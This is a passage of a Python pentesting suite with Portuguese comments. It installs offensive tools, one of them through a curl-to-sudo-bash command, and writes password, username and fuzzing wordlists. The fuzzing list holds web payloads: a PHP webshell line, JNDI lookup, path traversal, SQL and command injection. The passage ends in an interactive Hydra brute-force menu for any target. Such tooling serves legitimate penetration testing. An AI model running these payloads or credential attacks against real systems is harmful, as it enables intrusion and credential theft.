#!/usr/bin/env python3
"""
PENTEST SUITE PRO MAX - Sistema Completo de Pentesting Interativo
Versão sem dependências problemáticas
Autor: Security Master Suite
Versão: 5.0.0
"""

import os
import sys
import json
import shutil
import tarfile
import zipfile
import hashlib
import platform
import threading
import subprocess
import urllib.request
import urllib.parse
import ssl
import socket
import struct
import select
import random
import string
import time
import re
import base64
import binascii
import secrets
import hashlib
import hmac
from datetime import datetime, timedelta
from time import sleep
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict, Counter
from typing import Dict, List, Tuple, Optional, Any, Union
import io
import math
import statistics
from itertools import combinations, permutations
import logging
from logging.handlers import RotatingFileHandler
import argparse
import readline
import cmd
import sqlite3
import csv
import pickle
import xml.etree.ElementTree as ET
import warnings
import signal
import fcntl
import termios
import tty
import pty
import select
import queue
import multiprocessing

# Bibliotecas essenciais - tentar importar, mas continuar sem elas se não estiverem disponíveis
try:
    import colorama
    from colorama import Fore, Style, Back, init as colorama_init
    colorama_init(autoreset=True)
    COLORAMA_AVAILABLE = True
except ImportError:
    COLORAMA_AVAILABLE = False
    class FakeColorama:
        class Fore: BLACK=RED=GREEN=YELLOW=BLUE=MAGENTA=CYAN=WHITE=RESET=""
        class Style: DIM=NORMAL=BRIGHT=RESET_ALL=""
        class Back: BLACK=RED=GREEN=YELLOW=BLUE=MAGENTA=CYAN=WHITE=RESET=""
    Fore, Style, Back = FakeColorama.Fore, FakeColorama.Style, FakeColorama.Back

try:
    import yaml
    YAML_AVAILABLE = True
except ImportError:
    YAML_AVAILABLE = False

try:
    import requests
    from requests.exceptions import RequestException
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

try:
    from tqdm import tqdm
    TQDM_AVAILABLE = True
except ImportError:
    TQDM_AVAILABLE = False

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

try:
    import numpy as np
    NUMPY_AVAILABLE = True
except ImportError:
    NUMPY_AVAILABLE = False

try:
    import cv2
    import pytesseract
    from PIL import Image, ImageEnhance, ImageFilter, ImageDraw, ImageFont
    IMAGE_PROCESSING_AVAILABLE = True
except ImportError:
    IMAGE_PROCESSING_AVAILABLE = False

try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives import padding
    from cryptography.hazmat.backends import default_backend
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

try:
    import nmap
    import scapy.all as scapy
    from scapy.layers import http, dhcp, dns, dot11, radius
    from scapy.sendrecv import sniff, srp, sr1
    from scapy.layers.inet import IP, TCP, UDP, ICMP
    from scapy.layers.l2 import ARP, Ether
    NETWORK_SCANNING_AVAILABLE = True
except ImportError:
    NETWORK_SCANNING_AVAILABLE = False

try:
    import dns.resolver
    import dns.reversename
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False

try:
    import paramiko
    from paramiko import SSHClient, AutoAddPolicy, AuthenticationException
    SSH_AVAILABLE = True
except ImportError:
    SSH_AVAILABLE = False

try:
    import selenium
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.common.keys import Keys
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False

# ============================================================================
# CONFIGURAÇÕES E CONSTANTES
# ============================================================================

class Config:
    """Configurações globais do sistema"""
    VERSION = "5.0.0"
    APP_NAME = "Pentest Suite Pro Max"
    
    # Diretórios
    BASE_DIR = Path.home() / ".pentest_suite_max"
    TOOLS_DIR = BASE_DIR / "tools"
    CONFIGS_DIR = BASE_DIR / "configs"
    DATABASE_DIR = BASE_DIR / "database"
    LOGS_DIR = BASE_DIR / "logs"
    TEMP_DIR = BASE_DIR / "temp"
    SCANS_DIR = BASE_DIR / "scans"
    CAPTURES_DIR = BASE_DIR / "captures"
    ENCRYPTED_DIR = BASE_DIR / "encrypted"
    WORDLISTS_DIR = BASE_DIR / "wordlists"
    EXPLOITS_DIR = BASE_DIR / "exploits"
    REPORTS_DIR = BASE_DIR / "reports"
    SESSIONS_DIR = BASE_DIR / "sessions"
    MODULES_DIR = BASE_DIR / "modules"
    
    # Arquivos
    CONFIG_FILE = CONFIGS_DIR / "config.yaml"
    DATABASE_FILE = DATABASE_DIR / "suite.db"
    LOG_FILE = LOGS_DIR / "suite.log"
    KEYSTORE_FILE = CONFIGS_DIR / "keystore.bin"
    STATE_FILE = CONFIGS_DIR / "state.json"
    
    # Wordlists padrão
    DEFAULT_WORDLISTS = {
        'rockyou': '/usr/share/wordlists/rockyou.txt',
        'common_passwords': WORDLISTS_DIR / 'common_passwords.txt',
        'usernames': WORDLISTS_DIR / 'usernames.txt',
        'directories': WORDLISTS_DIR / 'directories.txt',
        'subdomains': WORDLISTS_DIR / 'subdomains.txt',
        'api_keys': WORDLISTS_DIR / 'api_keys.txt',
        'fuzzing': WORDLISTS_DIR / 'fuzzing.txt'
    }
    
    # Configurações padrão
    DEFAULT_CONFIG = {
        'system': {
            'max_threads': 10,
            'timeout': 600,
            'auto_update': True,
            'backup_enabled': True,
            'notifications': True,
            'log_level': 'INFO',
            'check_dependencies': True
        },
        'attack': {
            'hydra_threads': 16,
            'hydra_timeout': 30,
            'aircrack_timeout': 300,
            'nmap_timing': 'T4',
            'default_wordlist': 'rockyou',
            'rate_limit': 10
        },
        'network': {
            'default_interface': 'wlan0',
            'monitor_mode': True,
            'channel_hop': True,
            'deauth_packets': 10,
            'scan_timeout': 30
        },
        'web': {
            'user_agent': 'Mozilla/5.0 (PentestSuiteMax/5.0)',
            'timeout': 30,
            'follow_redirects': True,
            'retry_attempts': 3
        },
        'crypto': {
            'default_algorithm': 'AES-256-GCM',
            'hash_iterations': 100000,
            'key_length': 32
        }
    }

# ============================================================================
# SISTEMA DE INSTALAÇÃO DE DEPENDÊNCIAS
# ============================================================================

class DependencyManager:
    """Gerenciador de dependências inteligente"""
    
    DEPENDENCIES = {
        'system': {
            'commands': {
                'aircrack-ng': 'sudo apt install -y aircrack-ng',
                'hydra': 'sudo apt install -y hydra hydra-gtk',
                'nmap': 'sudo apt install -y nmap ncat ndiff',
                'sqlmap': 'sudo apt install -y sqlmap',
                'nikto': 'sudo apt install -y nikto',
                'dirb': 'sudo apt install -y dirb',
                'gobuster': 'sudo apt install -y gobuster',
                'john': 'sudo apt install -y john',
                'hashcat': 'sudo apt install -y hashcat ocl-icd-libopencl1',
                'metasploit': 'curl -sSL https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb | sudo bash',
                'wireshark': 'sudo apt install -y wireshark',
                'tshark': 'sudo apt install -y tshark',
                'tcpdump': 'sudo apt install -y tcpdump',
                'ettercap': 'sudo apt install -y ettercap-text-only',
                'wordlists': 'sudo apt install -y wordlists seclists'
            },
            'files': {
                '/usr/share/wordlists/rockyou.txt': 'sudo gunzip /usr/share/wordlists/rockyou.txt.gz 2>/dev/null || echo "Rockyou já existe"'
            }
        },
        'python': {
            'colorama': 'pip3 install colorama',
            'requests': 'pip3 install requests',
            'scapy': 'pip3 install scapy',
            'nmap': 'pip3 install python-nmap',
            'cryptography': 'pip3 install cryptography',
            'PIL': 'pip3 install Pillow',
            'numpy': 'pip3 install numpy',
            'yaml': 'pip3 install PyYAML',
            'tqdm': 'pip3 install tqdm',
            'psutil': 'pip3 install psutil',
            'paramiko': 'pip3 install paramiko',
            'selenium': 'pip3 install selenium',
            'beautifulsoup4': 'pip3 install beautifulsoup4',
            'dnspython': 'pip3 install dnspython',
            'openai': 'pip3 install openai',
            'pandas': 'pip3 install pandas'
        }
    }
    
    def __init__(self):
        self.logger = self._setup_logger()
        self.installed = self._load_installation_state()
    
    def _setup_logger(self):
        """Configurar logger"""
        logger = logging.getLogger('DependencyManager')
        logger.setLevel(logging.INFO)
        
        if not logger.handlers:
            handler = logging.StreamHandler()
            formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
            handler.setFormatter(formatter)
            logger.addHandler(handler)
        
        return logger
    
    def _load_installation_state(self):
        """Carregar estado de instalação"""
        state_file = Config.STATE_FILE
        if state_file.exists():
            try:
                with open(state_file, 'r') as f:
                    return json.load(f)
            except:
                return {'system': {}, 'python': {}}
        return {'system': {}, 'python': {}}
    
    def _save_installation_state(self):
        """Salvar estado de instalação"""
        state_file = Config.STATE_FILE
        with open(state_file, 'w') as f:
            json.dump(self.installed, f, indent=2)
    
    def check_command(self, command):
        """Verificar se comando está disponível"""
        try:
            result = subprocess.run(
                ['which', command],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=5
            )
            return result.returncode == 0
        except:
            return False
    
    def check_python_package(self, package):
        """Verificar se pacote Python está instalado"""
        try:
            __import__(package.replace('-', '_'))
            return True
        except ImportError:
            return False
    
    def install_system_package(self, package):
        """Instalar pacote do sistema"""
        if package not in self.DEPENDENCIES['system']['commands']:
            return False, f"Pacote não encontrado: {package}"
        
        command = self.DEPENDENCIES['system']['commands'][package]
        
        try:
            self.logger.info(f"Instalando {package}...")
            result = subprocess.run(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=300
            )
            
            if result.returncode == 0:
                self.installed['system'][package] = {
                    'installed': True,
                    'timestamp': datetime.now().isoformat()
                }
                self._save_installation_state()
                return True, f"{package} instalado com sucesso"
            else:
                return False, f"Falha ao instalar {package}: {result.stderr.decode()}"
                
        except subprocess.TimeoutExpired:
            return False, f"Timeout ao instalar {package}"
        except Exception as e:
            return False, f"Erro ao instalar {package}: {str(e)}"
    
    def install_python_package(self, package):
        """Instalar pacote Python"""
        if package not in self.DEPENDENCIES['python']:
            return False, f"Pacote Python não encontrado: {package}"
        
        command = self.DEPENDENCIES['python'][package]
        
        try:
            self.logger.info(f"Instalando pacote Python: {package}...")
            result = subprocess.run(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=300
            )
            
            if result.returncode == 0:
                self.installed['python'][package] = {
                    'installed': True,
                    'timestamp': datetime.now().isoformat()
                }
                self._save_installation_state()
                return True, f"Pacote {package} instalado com sucesso"
            else:
                return False, f"Falha ao instalar {package}: {result.stderr.decode()}"
                
        except subprocess.TimeoutExpired:
            return False, f"Timeout ao instalar {package}"
        except Exception as e:
            return False, f"Erro ao instalar {package}: {str(e)}"
    
    def install_all_dependencies(self, skip_system=False):
        """Instalar todas as dependências"""
        results = {'system': {}, 'python': {}}
        
        # Instalar pacotes do sistema
        if not skip_system:
            self.logger.info("Instalando pacotes do sistema...")
            for package in self.DEPENDENCIES['system']['commands']:
                self.logger.info(f"Verificando {package}...")
                if self.check_command(package.split()[0]):
                    results['system'][package] = {'installed': True, 'message': 'Já instalado'}
                    self.logger.info(f"  ✓ {package} já instalado")
                else:
                    success, message = self.install_system_package(package)
                    results['system'][package] = {'installed': success, 'message': message}
                    if success:
                        self.logger.info(f"  ✓ {message}")
                    else:
                        self.logger.error(f"  ✗ {message}")
        
        # Instalar pacotes Python
        self.logger.info("\nInstalando pacotes Python...")
        for package in self.DEPENDENCIES['python']:
            self.logger.info(f"Verificando {package}...")
            if self.check_python_package(package):
                results['python'][package] = {'installed': True, 'message': 'Já instalado'}
                self.logger.info(f"  ✓ {package} já instalado")
            else:
                success, message = self.install_python_package(package)
                results['python'][package] = {'installed': success, 'message': message}
                if success:
                    self.logger.info(f"  ✓ {message}")
                else:
                    self.logger.error(f"  ✗ {message}")
        
        # Configurar arquivos do sistema
        self.logger.info("\nConfigurando arquivos do sistema...")
        for file_path, command in self.DEPENDENCIES['system']['files'].items():
            if not os.path.exists(file_path):
                try:
                    subprocess.run(command, shell=True, check=True)
                    self.logger.info(f"  ✓ Configurado: {file_path}")
                except:
                    self.logger.error(f"  ✗ Falha ao configurar: {file_path}")
        
        return results
    
    def check_essential_dependencies(self):
        """Verificar dependências essenciais"""
        essential = {
            'system': ['aircrack-ng', 'hydra', 'nmap', 'sqlmap'],
            'python': ['colorama', 'requests', 'scapy']
        }
        
        missing = []
        
        for package in essential['system']:
            if not self.check_command(package):
                missing.append(('system', package))
        
        for package in essential['python']:
            if not self.check_python_package(package):
                missing.append(('python', package))
        
        return missing
    
    def create_wordlists(self):
        """Criar wordlists personalizadas"""
        Config.WORDLISTS_DIR.mkdir(exist_ok=True)
        
        # Common passwords
        common_passwords = [
            'password', '123456', '12345678', '1234', 'qwerty', '12345',
            'dragon', 'baseball', 'football', 'letmein', 'monkey', '696969',
            'abc123', 'mustang', 'michael', 'shadow', 'master', 'jennifer',
            '111111', 'superman', 'harley', 'fuckme', 'fuckyou', 'batman',
            'trustno1', 'admin', 'root', 'toor', 'administrator', 'password123',
            '123123', 'welcome', 'login', 'pass', 'pass123', '123qwe',
            'qwerty123', 'qwertyuiop', 'asdfghjkl', 'zxcvbnm', 'sunshine',
            'iloveyou', 'starwars', 'startrek', 'matrix', 'superman', 'super123'
        ]
        
        with open(Config.DEFAULT_WORDLISTS['common_passwords'], 'w') as f:
            f.write('\n'.join(common_passwords))
        
        # Usernames
        usernames = [
            'admin', 'root', 'user', 'test', 'guest', 'administrator',
            'operator', 'manager', 'supervisor', 'support', 'backup',
            'service', 'system', 'mysql', 'oracle', 'postgres', 'ftp',
            'ssh', 'www-data', 'apache', 'nginx', 'tomcat', 'jenkins',
            'git', 'svn', 'docker', 'kubernetes', 'ansible', 'vagrant'
        ]
        
        with open(Config.DEFAULT_WORDLISTS['usernames'], 'w') as f:
            f.write('\n'.join(usernames))
        
        # Directories
        directories = [
            'admin', 'administrator', 'backup', 'backups', 'bin', 'config',
            'configuration', 'css', 'data', 'database', 'db', 'doc', 'docs',
            'documentation', 'download', 'downloads', 'etc', 'files', 'home',
            'images', 'img', 'include', 'includes', 'index', 'js', 'lib',
            'library', 'log', 'logs', 'mail', 'media', 'private', 'public',
            'secret', 'secure', 'server', 'src', 'sql', 'static', 'tmp',
            'upload', 'uploads', 'user', 'users', 'var', 'web', 'webapp',
            'wordpress', 'wp', 'wp-admin', 'wp-content', 'wp-includes'
        ]
        
        with open(Config.DEFAULT_WORDLISTS['directories'], 'w') as f:
            f.write('\n'.join(directories))
        
        # Subdomains
        subdomains = [
            'www', 'mail', 'ftp', 'blog', 'api', 'dev', 'test', 'staging',
            'admin', 'portal', 'secure', 'vpn', 'webmail', 'mx', 'ns1',
            'ns2', 'cdn', 'static', 'assets', 'images', 'img', 'media',
            'download', 'uploads', 'support', 'help', 'wiki', 'docs',
            'documentation', 'status', 'monitor', 'monitoring', 'log',
            'logs', 'analytics', 'stats', 'statistics', 'shop', 'store',
            'cart', 'checkout', 'payment', 'pay', 'billing', 'invoice'
        ]
        
        with open(Config.DEFAULT_WORDLISTS['subdomains'], 'w') as f:
            f.write('\n'.join(subdomains))
        
        # API Keys patterns
        api_keys = [
            'api_key=', 'apikey=', 'secret=', 'token=', 'auth=',
            'password=', 'passwd=', 'pwd=', 'key=', 'access_key=',
            'access_token=', 'oauth_token=', 'bearer=', 'jwt=',
            'session=', 'cookie=', 'authorization:', 'x-api-key:',
            'x-auth-token:', 'x-access-token:', 'x-csrf-token:'
        ]
        
        with open(Config.DEFAULT_WORDLISTS['api_keys'], 'w') as f:
            f.write('\n'.join(api_keys))
        
        # Fuzzing patterns
        fuzzing = [
            '../../../etc/passwd', '../../etc/passwd', '/etc/passwd',
            '../../../windows/win.ini', '../../windows/win.ini',
            '<?php system($_GET[\'cmd\']); ?>', '${jndi:ldap://',
            '<script>alert(1)</script>', '\' OR \'1\'=\'1',
            '\' UNION SELECT NULL--', '1\' ORDER BY 1--',
            '; ls -la', '| cat /etc/passwd', '`id`',
            '$(whoami)', '{{7*7}}', '${7*7}'
        ]
        
        with open(Config.DEFAULT_WORDLISTS['fuzzing'], 'w') as f:
            f.write('\n'.join(fuzzing))
        
        self.logger.info("Wordlists criadas com sucesso!")
        return True

# ============================================================================
# SISTEMA HYDRA INTERATIVO AVANÇADO
# ============================================================================

class AdvancedHydraManager:
    """Gerenciador avançado do Hydra com mais recursos"""
    
    PROTOCOLS = {
        'ftp': {'port': 21, 'description': 'FTP server'},
        'ssh': {'port': 22, 'description': 'SSH server'},
        'telnet': {'port': 23, 'description': 'Telnet server'},
        'smtp': {'port': 25, 'description': 'SMTP server'},
        'http-get': {'port': 80, 'description': 'HTTP GET method'},
        'http-post': {'port': 80, 'description': 'HTTP POST method'},
        'https-get': {'port': 443, 'description': 'HTTPS GET method'},
        'https-post': {'port': 443, 'description': 'HTTPS POST method'},
        'pop3': {'port': 110, 'description': 'POP3 server'},
        'imap': {'port': 143, 'description': 'IMAP server'},
        'rdp': {'port': 3389, 'description': 'Remote Desktop'},
        'vnc': {'port': 5900, 'description': 'VNC server'},
        'mysql': {'port': 3306, 'description': 'MySQL database'},
        'mssql': {'port': 1433, 'description': 'Microsoft SQL Server'},
        'postgres': {'port': 5432, 'description': 'PostgreSQL database'},
        'oracle': {'port': 1521, 'description': 'Oracle database'},
        'ldap2': {'port': 389, 'description': 'LDAP protocol v2'},
        'ldap3': {'port': 389, 'description': 'LDAP protocol v3'},
        'snmp': {'port': 161, 'description': 'SNMP service'},
        'socks5': {'port': 1080, 'description': 'SOCKS5 proxy'},
        'smb': {'port': 445, 'description': 'SMB/CIFS shares'},
        'imap-ssl': {'port': 993, 'description': 'IMAP over SSL'},
        'pop3-ssl': {'port': 995, 'description': 'POP3 over SSL'},
        'smtp-ssl': {'port': 465, 'description': 'SMTP over SSL'},
        'cisco': {'port': 23, 'description': 'Cisco devices'},
        'cisco-enable': {'port': 23, 'description': 'Cisco enable'}
    }
    
    def __init__(self):
        self.logger = logging.getLogger('AdvancedHydraManager')
        self.session_file = None
        self.resume_session = False
    
    def interactive_attack(self):
        """Interface interativa completa para ataque com Hydra"""
        self._show_banner()
        
        # Selecionar modo
        mode = self._select_mode()
        
        if mode == 'standard':
            self._standard_attack()
        elif mode == 'advanced':
            self._advanced_attack()
        elif mode == 'resume':
            self._resume_attack()
        elif mode == 'combo':
            self._combo_attack()
    
    def _show_banner(self):
        """Mostrar banner do Hydra"""
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{'THC-HYDRA ADVANCED ATTACK SUITE':^80}")
        print(f"{'='*80}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Versão: 9.4{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Protocolos suportados: {len(self.PROTOCOLS)}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Threads máximos: 128{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*80}{Style.RESET_ALL}\n")
    
    def _select_mode(self):
        """Selecionar modo de ataque"""
        print(f"{Fore.YELLOW}Modos de ataque disponíveis:{Style.RESET_ALL}")
        print("1. Ataque padrão (recomendado)")
        print("2. Ataque avançado (opções personalizadas)")
        print("3. Retomar ataque anterior")
        print("4. Ataque combo (usuário:senha combos)")
        print("5. Gerar wordlist personalizada")
        
        while True:
            choice = input(f"\n{Fore.GREEN}Selecione o modo [1-5]: {Style.RESET_ALL}").strip()
            
            if choice == '1':
                return 'standard'
            elif choice == '2':
                return 'advanced'
            elif choice == '3':
                return 'resume'
            elif choice == '4':
                return 'combo'
            elif choice == '5':
                self._generate_custom_wordlist()
                return self._select_mode()
            else:
                print(f"{Fore.RED}Opção inválida!{Style.RESET_ALL}")
    
    def _standard_attack(self):
        """Ataque padrão passo-a-passo"""
        print(f"\n{Fore.CYAN}[1/7] Selecionar protocolo{Style.RESET_ALL}")
        protocol = self._select_protocol()
        
        print(f"\n{Fore.CYAN}[2/7] Configurar alvo{Style.RESET_ALL}")
        target = input(f"{Fore.GREEN}Alvo (IP/hostname): {Style.RESET_ALL}").strip()
        
        default_port = self.PROTOCOLS[protocol]['port']
        port = input(f"{Fore.GREEN}Porta [padrão: {default_port}]: {Style.RESET_ALL}").strip()
        port = port if port else str(default_port)
        
        print(f"\n{Fore.CYAN}[3/7] Configurar lista de usuários{Style.RESET_ALL}")
        user_method = self._select_user_method()
        user_file = self._get_user_list(user_method)
        
        print(f"\n{Fore.CYAN}[4/7] Configurar lista de senhas{Style.RESET_ALL}")
        pass_method = self._select_password_method()
        pass_file = self._get_password_list(pass_method)
        
        print(f"\n{Fore.CYAN}[5/7] Configurar performance{Style.RESET_ALL}")
        threads = input(f"{Fore.GREEN}Threads [padrão: 16]: {Style.RESET_ALL}").strip() or "16"
        timeout = input(f"{Fore.GREEN}Timeout por tentativa [segundos, padrão: 30]: {Style.RESET_ALL}").strip() or "30"
        
        print(f"\n{Fore.CYAN}[6/7] Configurar output{Style.RESET_ALL}")
        output_file = self._get_output_file(protocol, target)
        
        print(f"\n{Fore.CYAN}[7/7] Opções adicionais{Style.RESET_ALL}")
        verbose = input(f"{Fore.GREEN}Modo verboso? (s/n) [padrão: s]: {Style.RESET_ALL}").strip().lower() or "s"
        stop_on_success = input(f"{Fore.GREEN}Parar na primeira senha encontrada? (s/n) [padrão: n]: {Style.RESET_ALL}").strip().lower() or "n"
        
        # Construir comando
        cmd = self._build_hydra_command(
            protocol=protocol,
            target=target,
            port=port,
            user_file=user_file,
            pass_file=pass_file,
            threads=threads,
            timeout=timeout,
            output_file=output_file,
            verbose=verbose == 's',
            stop_on_success=stop_on_success == 's'
        )
        
        # Executar ataque
        self._execute_attack(cmd, protocol, target)
    
    def _select_protocol(self):
        """Selecionar protocolo"""
        print(f"{Fore.YELLOW}Protocolos disponíveis (grupos):{Style.RESET_ALL}")
        print("1. Serviços Web (HTTP/HTTPS)")
        print("2. Serviços de Email")
        print("3. Bancos de Dados")
        print("4. Serviços de Rede")
        print("5. Serviços Remotos")
        print("6. Listar todos")
        
        group_choice = input(f"\n{Fore.GREEN}Selecione grupo [1-6]: {Style.RESET_ALL}").strip()
        
        protocols_by_group = {
            '1': ['http-get', 'http-post', 'https-get', 'https-post'],
            '2': ['smtp', 'smtp-ssl', 'pop3', 'pop3-ssl', 'imap', 'imap-ssl'],
            '3': ['mysql', 'mssql', 'postgres', 'oracle'],
            '4': ['ftp', 'ssh', 'telnet', 'snmp', 'ldap2', 'ldap3'],
            '5': ['rdp', 'vnc', 'socks5', 'smb', 'cisco', 'cisco-enable']
        }
        
        if group_choice == '6':
            # Listar todos
            for i, (proto, info) in enumerate(self.PROTOCOLS.items(), 1):
                print(f"{i:3}. {proto:<20} ({info['port']}) - {info['description']}")
            
            while True:
                try:
                    choice = input(f"\n{Fore.GREEN}Selecione protocolo (número ou nome): {Style.RESET_ALL}")
                    if choice.isdigit():
                        idx = int(choice) - 1
                        if 0 <= idx < len(self.PROTOCOLS):
                            return list(self.PROTOCOLS.keys())[idx]
                    elif choice in self.PROTOCOLS:
                        return choice
                    print(f"{Fore.RED}Opção inválida!{Style.RESET_ALL}")
                except ValueError:
                    print(f"{Fore.RED}Entrada inválida!{Style.RESET_ALL}")
        
        elif group_choice in protocols_by_group:
            protocols = protocols_by_group[group_choice]
            print(f"\n{Fore.YELLOW}Protocolos no grupo:{Style.RESET_ALL}")
            for i, proto in enumerate(protocols, 1):
                info = self.PROTOCOLS[proto]
                print(f"{i}. {proto:<15} ({info['port']}) - {info['description']}")
            
            while True:
                try:
                    choice = input(f"\n{Fore.GREEN}Selecione protocolo [1-{len(protocols)}]: {Style.RESET_ALL}")
                    if choice.isdigit():
                        idx = int(choice) - 1
                        if 0 <= idx < len(protocols):
                            return protocols[idx]
                    elif choice in protocols:
                        return choice
                    print(f"{Fore.RED}Opção inválida!{Style.RESET_ALL}")
                except ValueError:
                    print(f"{Fore.RED}Entrada inválida!{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}Grupo inválido! Usando SSH como padrão.{Style.RESET_ALL}")
            return 'ssh'
    
    def _select_user_method(self):
        """Selecionar método para lista de usuários"""
        print(f"{Fore.YELLOW}Métodos para lista de usuários:{Style.RESET_ALL}")
        print("1. Usar wordlist padrão (usernames.txt)")
        print("2. Fornecer arquivo personalizado")
        print("3. Usar usuário único")
        print("4. Gerar lista com padrão")
        print("5. Usar lista de combos (usuário:senha)")
        
        while True:
            choice = input(f"\n{Fore.GREEN}Selecione método [1-5]: {Style.RESET_ALL}").strip()
            if choice in ['1', '2', '3', '4', '5']:
                return choice
            print(f"{Fore.RED}Opção inválida!{Style.RESET_ALL}")
    
    def _select_password_method(self):
        """Selecionar método para lista de senhas"""
        print(f"{Fore.YELLOW}Métodos para lista de senhas:{Style.RESET_ALL}")
        print("1. Usar rockyou.txt")
        print("2. Fornecer arquivo personalizado")
        print("3. Usar senha única")
        print("4. Gerar lista com padrão")
        print("5. Ataque de dicionário inteligente")
        
        while True:
            choice = input(f"\n{Fore.GREEN}Selecione método [1-5]: {Style.RESET_ALL}").strip()
            if choice in ['1', '2', '3', '4', '5']:
                return choice
            print(f"{Fore.RED}Opção inválida!{Style.RESET_ALL}")
    
    def _get_user_list(self, method):
        """Obter lista de usuários baseada no método"""
        if method == '1':
            return str(Config.DEFAULT_WORDLISTS['usernames'])
        elif method == '2':
            while True:
                user_file = input(f"{Fore.GREEN}Caminho do arquivo de usuários: {Style.RESET_ALL}").strip()
                if os.path.exists(user_file):
                    return user_file
                print(f"{Fore.RED}Arquivo não encontrado!{Style.RESET_ALL}")
        elif method == '3':
            username = input(f"{Fore.GREEN}Usuário específico: {Style.RESET_ALL}").strip()
            temp_file = self._create_temp_file([username])
            return temp_file
        elif method == '4':
            return self._generate_pattern_list('users')
        elif method == '5':
            combo_file = input(f"{Fore.GREEN}Caminho do arquivo combo (usuário:senha): {Style.RESET_ALL}").strip()
            if os.path.exists(combo_file):
                return combo_file
            else:
                print(f"{Fore.RED}Arquivo não encontrado! Usando padrão.{Style.RESET_ALL}")
                return str(Config.DEFAULT_WORDLISTS['usernames'])
    
    def _get_password_list(self, method):
        """Obter lista de senhas baseada no método"""
        if method == '1':
            return Config.DEFAULT_WORDLISTS['rockyou']
        elif method == '2':
            while True:
                pass_file = input(f"{Fore.GREEN}Caminho do arquivo de senhas: {Style.RESET_ALL}").strip()
                if os.path.exists(pass_file):
                    return pass_file
                print(f"{Fore.RED}Arquivo não encontrado!{Style.RESET_ALL}")
        elif method == '3':
            password = input(f"{Fore.GREEN}Senha específica: {Style.RESET_ALL}").strip()
            temp_file = self._create_temp_file([password])
            return temp_file
        elif method == '4':
            return self._generate_pattern_list('passwords')
        elif method == '5':
            return self._generate_smart_wordlist()
    
    def _generate_smart_wordlist(self):
        """Gerar wordlist inteligente baseada no alvo"""
        print(f"\n{Fore.YELLOW}Gerando wordlist inteligente...{Style.RESET_ALL}")
        
        target_info = input(f"{Fore.GREEN}Informações sobre o alvo (empresa, setor, etc.): {Style.RESET_ALL}").strip()
        common_words = input(f"{Fore.GREEN}Palavras-chave relacionadas (separadas por vírgula): {Style.RESET_ALL}").strip()
        
        words = []
        
        # Adicionar palavras do alvo
        if target_info:
            words.extend(target_info.lower().split())
        
        # Adicionar palavras-chave
        if common_words:
            words.extend([w.strip().lower() for w in common_words.split(',')])
        
        # Adicionar padrões comuns
        patterns = [
            '123', '1234', '12345', '123456', '12345678', '123456789',
            'password', 'pass', 'pass123', 'admin', 'root', 'user',
            'qwerty', 'asdf', 'zxcv', 'letmein', 'welcome', 'login',
            'secret', 'private', 'test', 'demo', 'temp', 'backup'
        ]
        
        words.extend(patterns)
        
        # Gerar combinações
        generated = set()
        
        for word in words:
            if word:
                generated.add(word)
                generated.add(word + '123')
                generated.add(word + '1234')
                generated.add(word + '12345')
                generated.add('123' + word)
                generated.add(word.capitalize())
                generated.add(word.upper())
                generated.add(word + '!')
                generated.add(word + '@')
                generated.add(word + '#')
                generated.add(word + '2023')
                generated.add(word + '2024')
        
        # Limitar tamanho
        generated = list(generated)[:1000]
        
        temp_file = self._create_temp_file(generated)
        print(f"{Fore.GREEN}Wordlist inteligente gerada com {len(generated)} entradas{Style.RESET_ALL}")
        return temp_file
    
    def _generate_pattern_list(self, list_type):
        """Gerar lista baseada em padrão"""
        print(f"\n{Fore.YELLOW}Padrões disponíveis para {list_type}:{Style.RESET_ALL}")
        
        if list_type == 'users':
            print("1. Administradores comuns")
            print("2. Usuários de sistema")
            print("3. Nomes comuns")
            print("4. Padrão personalizado")
            
            choice = input(f"\n{Fore.GREEN}Selecione padrão [1-4]: {Style.RESET_ALL}").strip()
            
            if choice == '1':
                users = ['admin', 'administrator', 'root', 'superuser', 'sysadmin', 'manager']
            elif choice == '2':
                users = ['system', 'service', 'daemon', 'nobody', 'www-data', 'apache', 'nginx']
            elif choice == '3':
                users = ['john', 'jane', 'test', 'user', 'guest', 'demo', 'backup']
            else:
                pattern = input(f"{Fore.GREEN}Padrão (ex: user{0.100}): {Style.RESET_ALL}").strip()
                return self._generate_from_pattern(pattern)
        
        else:  # passwords
            print("1. Números sequenciais (0000-9999)")
            print("2. Datas (01011970-31122024)")
            print("3. Palavras com números")
            print("4. Padrão personalizado")
            
            choice = input(f"\n{Fore.GREEN}Selecione padrão [1-4]: {Style.RESET_ALL}").strip()
            
            if choice == '1':
                passwords = [f"{i:04d}" for i in range(10000)]
            elif choice == '2':
                passwords = self._generate_date_passwords()
            elif choice == '3':
                base_word = input(f"{Fore.GREEN}Palavra base: {Style.RESET_ALL}").strip()
                passwords = [f"{base_word}{i}" for i in range(100)] + [f"{i}{base_word}" for i in range(100)]
            else:
                pattern = input(f"{Fore.GREEN}Padrão (ex: pass{0.100}): {Style.RESET_ALL}").strip()
                return self._generate_from_pattern(pattern)
        
